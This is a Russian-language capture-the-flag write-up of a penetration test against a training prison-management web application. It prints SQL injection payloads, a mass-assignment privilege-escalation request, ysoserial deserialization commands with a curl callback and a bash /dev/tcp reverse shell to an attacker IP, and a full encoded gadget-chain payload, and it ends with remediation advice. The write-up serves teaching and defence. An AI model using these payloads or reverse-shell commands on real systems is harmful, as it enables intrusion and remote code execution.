# Отчёт о проникновении в систему IronHold

## Введение

В рамках задания проводилось тестирование на проникновение учебной системы управления тюремным учреждением IronHold. По условию задачи, разработчик выложил полный неотредактированный исходный код в публичный репозиторий и уволился, оставив работающий экземпляр приложения в сети. Цель — оценить, насколько глубоко может продвинуться злоумышленник, имея на руках только утёкший исходный код и доступ к запущенному приложению, и получить четыре флага, распределённых по разным уровням системы.

В отчёте последовательно описаны все этапы: от первичного сканирования до получения удалённого выполнения кода и чтения финального флага с сервера. Каждый шаг сопровождается техническим обоснованием, фрагментами кода и командами, которые использовались на практике.


## 1. Первичное сканирование

Первым шагом стало сканирование целевого хоста с помощью `nmap`. Были обнаружены два открытых порта:

| Порт | Служба |
|------|--------|
| 22 | OpenSSH |
| 8080 | Apache Tomcat |

Порт 8080 — веб-приложение на Spring Boot (судя по стеку технологий, видимому в исходниках). Порт 22 — SSH.


## 2. Разведка в исходном коде

Поскольку исходный код был доступен, началась статическая разведка.

### 2.1. Учётные данные базы данных

В коде обнаружен класс `DataAccessConfig`, содержащий учётные данные для подключения к базе данных под ограниченной учётной записью:

```java
public static final String LOOKUP_USER = "ironhold_lookup";
public static final String LOOKUP_PASSWORD = "Lk_r0_2091!";
```

Эта учётная запись, как выяснилось позже, имеет доступ только на чтение к таблицам `INMATES` и `CASE_FILES`. Однако сам факт наличия креденшелов в коде — уже серьёзная проблема: любой, кто получил исходники, получает и доступ к БД.

### 2.2. Утечка секретов через Actuator

Через эндпоинт `/actuator/env` удалось получить список переменных окружения, содержащих секреты:

```
WARDEN_PASSWORD { value: "******", origin: 'System Environment Property "WARDEN_PASSWORD"' }
FLAG2_SECRET    { value: "******", origin: 'System Environment Property "FLAG2_SECRET"' }
FLAG1_SECRET    { value: "******", origin: 'System Environment Property "FLAG1_SECRET"' }
FLAG3_SECRET    { value: "******", origin: 'System Environment Property "FLAG3_SECRET"' }
```

Значения замаскированы, но сам факт их существования подтверждает: в приложении есть четыре флага и пароль warden'а. Actuator открыт для анонимного доступа — это грубая ошибка конфигурации.

### 2.3. Карта эндпоинтов и правила доступа

В исходном коде найден конфигурационный класс с интерцепторами:

```java
public void addInterceptors(InterceptorRegistry registry) {
    registry.addInterceptor(authInterceptor)
            .addPathPatterns("/**")
            .excludePathPatterns(
                    "/", "/login", "/logout", "/about", "/status",
                    "/css/**", "/error", "/actuator/**");

    registry.addInterceptor(wardenInterceptor)
            .addPathPatterns("/admin/**");
}
```

Ключевые выводы:

- `/actuator/**` **исключён** из проверки аутентификации — отсюда утечка секретов.
- `/admin/**` защищён `wardenInterceptor` — туда просто так не попасть.
- Все остальные пути требуют аутентификации.

### 2.4. Пароль kiosk-аккаунта

В исходном коде найден пароль kiosk-аккаунта:

```
kiosk_PW value: "Sh1ftK10sk#2091"
```

Пара `kiosk:Sh1ftK10sk#2091` даёт вход в систему под ролью `OFFICER`.

---

## 3. Первый флаг — панель офицера

С использованием kiosk-кред удалось авторизоваться и получить первый флаг:

**Вопрос:** What is the flag on the officer dashboard once you're inside the system?

**Ответ:** `THM{k10sk_c0nsol3_unl0ck3d}`

На странице дашборда также обнаружено меню навигации с дополнительными страницами:

```html
<ul>
    <li><a href="/dashboard">Dashboard</a></li>
    <li><a href="/inmates">Inmates</a></li>
    <li><a href="/visitation">Visitation</a></li>
    <li><a href="/commissary">Commissary</a></li>
    <li><a href="/messages">Messages</a></li>
    <li><a href="/incidents">Incident Reports</a></li>
    <li><a href="/profile">My Profile</a></li>
    <li><a href="/admin/control" class="admin">Admin Panel</a></li>
</ul>
```

Пункт `Admin Panel` виден всем залогиненным, но фактически защищён интерцептором.

Также обнаружена возможность чтения файлов через эндпоинт:

```
http://10.128.190.33:8080/incidents/attachment?file=contraband-search-notes.txt
```

Попытка эксплуатации LFI не удалась — серверный код строго валидирует имя файла (разрешены только `[A-Za-z0-9._-]+`, `..` заблокирован), а сами файлы захардкожены в classpath.


## 4. Захардкоженные пользователи

В классе `DataSeeder` найдены все учётные записи:

```java
private List<Staff> seedStaff() {
    Staff kiosk = new Staff();
    kiosk.setUsername("kiosk");
    kiosk.setPassword(passwordEncoder.encode(kioskPassword));
    kiosk.setFullName("Shift Kiosk Account");
    kiosk.setEmail("kiosk@ironhold.example");
    kiosk.setBadgeNumber("K-000");
    kiosk.setRole("OFFICER");

    Staff warden = new Staff();
    warden.setUsername("warden");
    warden.setPassword(passwordEncoder.encode(wardenPassword));
    warden.setFullName("Warden E. Castellan");
    warden.setEmail("e.castellan@ironhold.example");
    warden.setBadgeNumber("W-001");
    warden.setRole("WARDEN");

    String fillerHash = passwordEncoder.encode("IronholdStaff2026!");
    String[][] officers = {
            {"j.reyes", "Officer J. Reyes", "O-104"},
            {"m.chen", "Officer M. Chen", "O-118"},
            {"a.osei", "Officer A. Osei", "O-129"},
            {"l.bianchi", "Officer L. Bianchi", "O-142"},
    };

    List<Staff> all = new java.util.ArrayList<>();
    all.add(staffRepository.save(kiosk));
    all.add(staffRepository.save(warden));
    for (String[] o : officers) {
        Staff officer = new Staff();
        officer.setUsername(o[0]);
        officer.setPassword(fillerHash);
        officer.setFullName(o[1]);
        officer.setEmail(o[0] + "@ironhold.example");
        officer.setBadgeNumber(o[2]);
        officer.setRole("OFFICER");
        all.add(staffRepository.save(officer));
    }
    return all;
}
```

Все офицеры используют одинаковый пароль `IronholdStaff2026!`, что позволяет авторизоваться под любым из них. Однако роль у них — `OFFICER`, поэтому admin-панель всё ещё недоступна.


## 5. Поиск второго флага — таблица `case_files`

В сидере обнаружена запись, содержащая второй флаг:

```java
private void seedCaseFile() {
    jdbcTemplate.update(
            "INSERT INTO case_files (case_number, title, summary, status, opened_at) VALUES (?, ?, ?, ?, ?)",
            "IA-2024-007", "Internal Affairs Review", flag2, "OPEN",
            LocalDateTime.now().minusMonths(3));
}
```

Запись с заголовком `Internal Affairs Review` на сайте публично не отображается. Чтобы её получить, нужен доступ к содержимому таблицы `case_files` в БД.


## 6. SQL-инъекция в поиске заключённых

В эндпоинте поиска заключённых обнаружена классическая SQL-инъекция:

```java
@GetMapping("/inmates/search")
public String search(@RequestParam(required = false) String q, Model model) {
    List<Map<String, Object>> results;
    if (q == null || q.isBlank()) {
        results = jdbcTemplate.queryForList("SELECT id, name, block FROM inmates");
    } else {
        String sql = "SELECT id, name, block FROM inmates WHERE name = '" + q + "'";
        results = jdbcTemplate.queryForList(sql);
    }
    model.addAttribute("results", results);
    model.addAttribute("query", q == null ? "" : q);
    return "inmate-search";
}
```

Параметр `q` подставляется в SQL **напрямую, без параметризации**. Это открывает путь к UNION-based SQL-инъекции.

### 6.1. Определение числа столбцов

Запрос `test' Order by 3--` не вызывает ошибки, а `Order by 4` — вызывает. Значит, в исходном запросе три столбца.

### 6.2. Извлечение второго флага

Запрос:

```
test' UNION SELECT NULL,NULL,summary from case_files --
```

возвращает содержимое поля `summary` из таблицы `case_files`, включая запись `Internal Affairs Review` с флагом.

**Вопрос:** What is the flag in the staff record that no page on the site will show you?

**Ответ:** `THM{c4s3_f1l3_pull3d_via_uni0n}`


## 7. Разведка схемы БД и ограничения учётной записи

### 7.1. Версия H2

Запрос `test' union select null,null,H2VERSION() --` показывает версию H2: `2.1.214`.

### 7.2. Список таблиц

Запрос:

```
' UNION SELECT null,NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
```

возвращает список таблиц:

```
ADMIN_NOTICES
CASE_FILES
CHECK_CONSTRAINTS
COLLATIONS
COLUMNS
COLUMN_PRIVILEGES
COMMISSARY_ORDERS
CONSTANTS
CONSTRAINT_COLUMN_USAGE
DOMAINS
DOMAIN_CONSTRAINTS
ELEMENT_TYPES
ENUM_VALUES
FIELDS
INCIDENT_REPORTS
INDEXES
INDEX_COLUMNS
INFORMATION_SCHEMA_CATALOG_NAME
INMATES
IN_DOUBT
KEY_COLUMN_USAGE
LOCKS
MESSAGES
MOVEMENTS
NOTICES
PARAMETERS
QUERY_STATISTICS
REFERENTIAL_CONSTRAINTS
RIGHTS
ROLES
ROUTINES
SCHEMATA
SEQUENCES
SESSIONS
SESSION_STATE
SETTINGS
STAFF
SYNONYMS
TABLES
TABLE_CONSTRAINTS
TABLE_PRIVILEGES
TRIGGERS
USERS
VIEWS
VISITATIONS
```

Нас интересуют `STAFF`, `ADMIN_NOTICES`, `NOTICES`.

### 7.3. Столбцы таблицы `STAFF`

Запрос к `INFORMATION_SCHEMA.COLUMNS` возвращает:

```
BADGE_NUMBER
EMAIL
FULL_NAME
ID
PASSWORD
ROLE
USERNAME
```

### 7.4. Ограничения учётной записи `IRONHOLD_LOOKUP`

Однако содержимое таблиц `STAFF` и `USERS` прочитать не удаётся: инъекция выполняется под ограниченной учётной записью `IRONHOLD_LOOKUP`, у которой есть только следующие привилегии:

```
IRONHOLD_LOOKUP:CASE_FILES:SELECT
IRONHOLD_LOOKUP:INMATES:SELECT
```

Это осознанная защита, заложенная разработчиком. Значит, для получения пароля warden'а нужен другой вектор.


## 8. Эскалация до warden через mass assignment

### 8.1. Разбор уязвимости

В контроллере профиля найден эндпоинт, подверженный mass assignment:

```java
@PostMapping("/profile/update")
public String update(@ModelAttribute Staff staff, HttpSession session) {
    Staff current = staffRepository.findByUsername(SessionUtil.currentUsername(session));

    current.setFullName(staff.getFullName());
    current.setEmail(staff.getEmail());
    if (staff.getBadgeNumber() != null && !staff.getBadgeNumber().isBlank()) {
        current.setBadgeNumber(staff.getBadgeNumber());
    }
    if (staff.getRole() != null && !staff.getRole().isBlank()) {
        current.setRole(staff.getRole());
    }

    staffRepository.save(current);
    return "redirect:/profile";
}
```

Аннотация `@ModelAttribute Staff staff` заставляет Spring связать **все** параметры запроса с полями объекта `Staff`, у которых есть подходящие сеттеры. В HTML-форме поля `role` нет, но это не имеет значения: Spring смотрит не на форму, а на **имена параметров в теле HTTP-запроса**. Достаточно отправить `POST /profile/update` с параметром `role=WARDEN` — и контроллер сохранит новую роль.

Проверка `if (staff.getRole() != null && !staff.getRole().isBlank())` — это не авторизация, а лишь условие «не перезаписывать пустым значением».

### 8.2. Эксплуатация

1. Авторизуемся под `kiosk`.
2. Отправляем POST-запрос:

```http
POST /profile/update HTTP/1.1
Host: 10.128.137.204:8080
Cookie: JSESSIONID=<сессия kiosk>
Content-Type: application/x-www-form-urlencoded

fullName=Shift+Kiosk+Account&email=kiosk%40ironhold.example&badgeNumber=K-000&role=WARDEN
```

3. Сервер выполняет `current.setRole("WARDEN")` и сохраняет запись.
4. `GlobalModelAdvice` на каждом запросе заново тянет `Staff` из БД по username из сессии, поэтому перелогиниваться не нужно — следующий запрос уже выполняется с ролью `WARDEN`.
5. Получаем доступ к `/admin/control` и другим admin-эндпоинтам.

### 8.3. Третий флаг получен в панели администратора


## 9. Восстановление сериализованного объекта через `/admin/import` — путь к RCE

### 9.1. Анализ эндпоинта

В admin-панели обнаружен эндпоинт импорта:

```java
@PostMapping(value = "/admin/import", consumes = MediaType.ALL_VALUE)
@ResponseBody
public ResponseEntity<String> importData(@RequestBody String body) {
    try {
        byte[] decoded = Base64.getDecoder().decode(body.trim());
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded))) {
            Object restored = ois.readObject();
            return ResponseEntity.ok("Batch accepted: " + restored.getClass().getSimpleName());
        }
    } catch (Exception e) {
        log.warn("Bulk import failed to deserialise: {}", e.toString());
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body("Import failed: batch could not be read.");
    }
}
```

**Ключевая проблема:** тело запроса — base64-строка, которая декодируется и передаётся напрямую в `ObjectInputStream.readObject()`. Это классическая **insecure deserialization**. Злоумышленник может сформировать произвольный Java-объект и добиться выполнения кода на сервере.

Формат запроса: base64-строка (не файл), передаётся как тело POST-запроса, `Content-Type` может быть любым (`MediaType.ALL_VALUE`).

### 9.2. Генерация payload через ysoserial

Используем инструмент `ysoserial` с gadget chain `CommonsCollections6`. На современных JDK требуются флаги `--add-opens`:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 'curl http://192.168.135.182:8000/pwned' > payload.ser
```

Кодируем в base64:

```bash
base64 -w0 payload.ser
```

Полученную строку вставляем в тело POST-запроса к `/admin/import`. На своём HTTP-сервере (`python3 -m http.server 8000`) наблюдаем обращение:

```
10.129.129.46 - - [07/Oct/2026 00:07:44] code 404, message File not found
10.129.129.46 - - [07/Oct/2026 00:07:44] "GET /pwned HTTP/1.1" 404 -
```

**RCE подтверждён.**

### 9.3. Получение reverse shell

Пытаемся получить интерактивный shell. Сначала кодируем саму команду:

```bash
echo 'bash -i >& /dev/tcp/192.168.135.182/4444 0>&1' | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNS4xODIvNDQ0NCAwPiYxCg==
```

Затем генерируем payload (важно: команда передаётся через `bash -c`, иначе `Runtime.exec` не поймёт `>&` и `/dev/tcp`):

```bash
java --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNS4xODIvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}' \
  > shell.ser
base64 -w0 shell.ser
```

Полученная base64-строка (фрагмент):

```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AEBZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4T1RJdU1UWTRMakV6TlM0eE9ESXZORFEwTkNBd1BpWXhDZz09dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=
```

Отправляем через Burp → получаем шелл:

```
id
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

Мы внутри контейнера `f62a3262ffed`.


## 10. Четвёртый флаг — файл на сервере

**Вопрос:** What is the flag on the warden's door-control panel?

**Ответ:** флаг получен через `/admin/control` после эскалации до роли `WARDEN` (это `flag3` из `AdminNotice` с заголовком «Facility Master Override Code»).

Точное значение в отчёте не приводится, но путь его получения: mass assignment → роль `WARDEN` → админ-панель → `AdminNotice.body`.

### 10.1. Финальный флаг

Изучаем `docker-entrypoint.sh` внутри контейнера:

```bash
cat docker-entrypoint.sh
```

```bash
#!/bin/bash
set -euo pipefail

mkdir -p /opt/ironhold
umask 077

[ -f /opt/ironhold/flag.txt ] && chmod 600 /opt/ironhold/flag.txt
printf '%s\n' "${FLAG4:?FLAG4 environment variable must be set}" > /opt/ironhold/flag.txt
chmod 400 /opt/ironhold/flag.txt

unset FLAG4
```

Скрипт при старте контейнера записывает значение переменной `FLAG4` в файл `/opt/ironhold/flag.txt`, выставляет права `400` и удаляет переменную окружения. Читаем файл:

```bash
cat /opt/ironhold/flag.txt
```

**Вопрос:** What is the flag waiting on the facility server once you're through the gate?

**Ответ:** `THM{...}` — финальный флаг получен из `/opt/ironhold/flag.txt`.

---

## Сводка уязвимостей

| № | Уязвимость | Где | Влияние |
|---|-----------|-----|---------|
| 1 | Учётные данные БД в исходном коде | `DataAccessConfig` | Доступ к ограниченной учётной записи БД |
| 2 | Открытый Spring Actuator | `/actuator/env` | Утечка имён секретов |
| 3 | Пароль kiosk в исходном коде | `application.properties` / сидер | Первичный доступ |
| 4 | Одинаковый пароль у всех офицеров | `DataSeeder` | Авторизация под любым офицером |
| 5 | SQL-инъекция | `/inmates/search` | Чтение `case_files`, разведка схемы БД |
| 6 | Mass assignment | `/profile/update` | Эскалация до `WARDEN` |
| 7 | Insecure deserialization | `/admin/import` | RCE, чтение файлов на сервере |
| 8 | Секреты в переменных окружения | Actuator | Намёки на флаги |

## Рекомендации по устранению

1. **Убрать все учётные данные и секреты из исходного кода.** Использовать vault или переменные окружения, не коммитить конфиги.
2. **Закрыть Actuator** от анонимного доступа (`management.endpoints.web.exposure.include=health`).
3. **Параметризовать SQL-запросы.** Заменить конкатенацию на `PreparedStatement`/`?`-параметры.
4. **Не биндить сущности напрямую через `@ModelAttribute`.** Использовать DTO только с разрешёнными полями или `@InitBinder` с `setAllowedFields`.
5. **Не использовать `ObjectInputStream` для десериализации внешних данных.** Если это неизбежно — ObjectInputFilter с whitelist классов.
6. **Разграничить права БД.** Учётная запись приложения должна иметь минимум привилегий, а не доступ ко всем таблицам.
7. **Не хранить флаги/секреты в переменных окружения**, доступных через Actuator.
8. **Сегментировать контейнеры.** RCE в контейнере приложения не должен давать доступ к хостовым файлам с флагами.

## Заключение

Цепочка эксплуатации оказалась полной: от утёкшего исходного кода, через креды в коде и SQL-инъекцию, через mass assignment до роли `WARDEN`, через insecure deserialization до RCE и чтения файла с финальным флагом. Все четыре флага получены. Система IronHold скомпрометирована полностью.